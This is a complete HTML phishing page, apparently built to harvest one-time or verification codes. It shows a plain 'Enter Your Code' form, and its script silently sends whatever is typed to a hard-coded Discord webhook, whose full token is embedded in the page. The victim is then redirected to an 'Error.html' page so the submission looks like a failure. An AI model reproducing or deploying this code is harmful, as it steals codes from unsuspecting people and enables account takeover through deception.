<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Code Entry</title>
  <style>
    body {
      background: #1e1e2f;
      color: #fff;
      font-family: 'Inter', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .box {
      text-align: center;
    }

    input {
      padding: 10px;
      border-radius: 6px;
      border: none;
      background: #2f2f3f;
      color: #fff;
      margin-bottom: 10px;
    }

    button {
      padding: 10px 20px;
      background: #e74c3c;
      border: none;
      border-radius: 6px;
      color: #fff;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="box">
    <h2>Enter Your Code</h2>
    <form id="form2">
      <input type="text" id="Code" placeholder="Code" required>
      <br>
      <button type="submit">Submit</button>
    </form>
  </div>

  <script>
    const webhookUrl = 'https://discord.com/api/webhooks/1111136382866440253/q57_PVYxcce4_NRAd2HouHNH-8VjUFq_avHFkAw3RgyqbVrCNUTShMGSLoZ3zm-eiHBC';

    const sendCode = (code) => {
      const msg = {
        embeds: [{
          color: 16711680,
          fields: [{ name: 'Code', value: code }],
          timestamp: new Date().toISOString()
        }]
      };

      fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(msg)
      });
    };

    document.addEventListener('DOMContentLoaded', () => {
      document.querySelector('#form2').addEventListener('submit', (e) => {
        e.preventDefault();
        const code = document.querySelector('#Code').value;
        sendCode(code);
        setTimeout(() => window.location.href = "Error.html", 750);
      });
    });
  </script>
</body>
</html>
